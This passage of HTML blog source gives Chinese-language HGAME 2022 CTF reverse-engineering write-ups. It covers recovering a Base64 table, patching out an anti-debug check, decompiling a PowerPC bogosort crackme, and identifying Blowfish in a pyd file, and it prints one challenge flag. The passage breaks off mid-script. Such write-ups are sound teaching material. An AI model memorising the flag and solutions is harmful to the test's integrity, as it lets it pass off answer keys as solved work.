&lt;h2 id=&#34;week3&#34;&gt;Week3&lt;/h2&gt;
&lt;h3 id=&#34;reanswers-windows&#34;&gt;[RE]Answer&amp;rsquo;s windows&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;right.png&lt;/code&gt; 字符串能够定位到验证函数&lt;/p&gt;
&lt;p&gt;动调发现使用了 string 的存储方式（好像就是把 string 内联了），只使用了 Base64 编码&lt;/p&gt;
&lt;p&gt;但 base 表和目标对应不上，显然是有反调试，自己做的时候直接猜到了真实表是 ascii 的前 64 个可见字符&lt;/p&gt;
&lt;p&gt;或者根据交叉引用找到 debug，把反调试判断 &lt;code&gt;nop&lt;/code&gt; 掉再动调即可&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 283; 
			flex-basis: 679px&#34;
	&gt;
	&lt;a href=&#34;/post/hgame2022-writeups/Answers_windows_solve.jpg&#34; data-size=&#34;1084x383&#34;&gt;
		&lt;img src=&#34;/post/hgame2022-writeups/Answers_windows_solve.jpg&#34;
			width=&#34;1084&#34;
			height=&#34;383&#34;
			srcset=&#34;/post/hgame2022-writeups/Answers_windows_solve_huc3bc26e113c65b72fa0fc4de0f5ee895_47933_480x0_resize_q75_box.jpg 480w, /post/hgame2022-writeups/Answers_windows_solve_huc3bc26e113c65b72fa0fc4de0f5ee895_47933_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;recreakme_3&#34;&gt;[RE]creakme_3&lt;/h3&gt;
&lt;p&gt;PPC 架构，用 ghidra 看的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;undefined4 &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)

{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fs;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; randnum;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; order_cnt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; order [&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;];
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; canary;
  
  canary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(fs &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7008&lt;/span&gt;);
  memset(order,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x164&lt;/span&gt;);
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome my whitegive re task! This is your flag: &amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
      randnum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
      order[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; randnum &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;;
    }
    order_cnt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((order_cnt &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (a[order[order_cnt &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; a[order[order_cnt] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])))
    {
      order_cnt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; order_cnt &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (order_cnt &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
    putchar(a[order[i] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (canary &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(fs &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7008&lt;/span&gt;)) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  }
                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
  __stack_chk_fail();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;手动恢复了一下符号，简单的说就是只有满足顺序都是 &lt;code&gt;&amp;lt;=&lt;/code&gt; 的时候才能退出第一个循环，所以 &lt;code&gt;rand()&lt;/code&gt; 只是个忽悠人并且浪费时间的东西（后来知道这个东西叫猴子加密）&lt;/p&gt;
&lt;p&gt;所以提取一下数字然后排序就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E7D&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67BD&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7A48&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x82A2&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x933E&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9C18&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5AFF&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6CD7&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA6CA&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBD79&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCEBD&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x324A&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3292&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3905&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4291&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5ADE&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E9F&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA52A&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBE35&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCB63&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7F3B&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3914&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB2AD&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38DA&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E50&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6A02&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB10F&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78E5&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7EF6&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89A3&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8EBD&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x95E3&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73DA&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x538C&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x633B&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E9C&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB78B&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC866&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32AE&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7679&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2AE7&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D6A&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5708&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6610&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA258&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB80C&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC885&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x710A&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7CF4&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F76&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x702B&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA3EE&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD50&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBAC7&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4024&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8A22&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC055&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2B52&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC687&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F00&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC417&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6182&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75DB&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C61&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4996&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5DC1&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D76&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7D17&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA91B&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9AED&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45D0&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8467&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAB5D&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5083&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6222&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8D93&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x923A&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x971E&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB4BA&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC785&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3558&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x86BD&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9738&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3710&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9779&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2F3F&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44DD&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78E1&lt;/span&gt;),
    (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F42&lt;/span&gt;)
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;takeSecond&lt;/span&gt;(elem):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; elem[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sort(key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;takeSecond)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a:
    print (chr(i[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame{B0go_50rt_is_s0_stup1d}fh32orh98sdfh23ikjsdf32&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;refishman&#34;&gt;[RE]fishman&lt;/h3&gt;
&lt;p&gt;pyd逆向&lt;/p&gt;
&lt;h4 id=&#34;定位函数&#34;&gt;定位函数&lt;/h4&gt;
&lt;p&gt;搜索字符串，能看到几个函数名&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 210; 
			flex-basis: 504px&#34;
	&gt;
	&lt;a href=&#34;/post/hgame2022-writeups/fishman_findfunc.png&#34; data-size=&#34;700x333&#34;&gt;
		&lt;img src=&#34;/post/hgame2022-writeups/fishman_findfunc.png&#34;
			width=&#34;700&#34;
			height=&#34;333&#34;
			srcset=&#34;/post/hgame2022-writeups/fishman_findfunc_hue684703702c421b42bd3f43ae89c2d7f_34701_480x0_resize_box_3.png 480w, /post/hgame2022-writeups/fishman_findfunc_hue684703702c421b42bd3f43ae89c2d7f_34701_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;比如 &lt;code&gt;init&lt;/code&gt; 函数就是 &lt;code&gt;sub_180002670&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;密码算法识别求解&#34;&gt;密码算法识别+求解&lt;/h4&gt;
&lt;p&gt;查看一下 &lt;code&gt;init&lt;/code&gt; 和 &lt;code&gt;check&lt;/code&gt; 函数，这题使用的是 &lt;code&gt;blowfish&lt;/code&gt; 密码，之前没有遇到过，所以是靠着 &lt;code&gt;findcrypt&lt;/code&gt; 脚本识别出来的&lt;/p&gt;
&lt;p&gt;顺便放一下搜到的加密算法源码，来源是 &lt;a class=&#34;link&#34; href=&#34;https://gitee.com/miao123456miao/blowfish2&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gitee.com/miao123456miao/blowfish2&lt;/a&gt;（github 连不上，呜呜呜）&lt;/p&gt;
&lt;p&gt;这是一个分组密码，主要的特征就是 &lt;code&gt;f&lt;/code&gt; 函数&lt;/p&gt;
&lt;p&gt;剩下的也没什么特别的，贴一下求解脚本吧&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ddl 师傅发现这个在 kali 上编译后会出现乱码，主要原因在于 kali 上编译后会把 low 放在低地址而 Ubuntu 会放在高地址，所以直接 &lt;code&gt;write(1, &amp;amp;high, 8)&lt;/code&gt; 就无法打印到 low，修改为 &lt;code&gt;write(1, &amp;amp;high, 4); write(1, &amp;amp;low, 4);&lt;/code&gt; 就能解决这个问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;blowfish.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
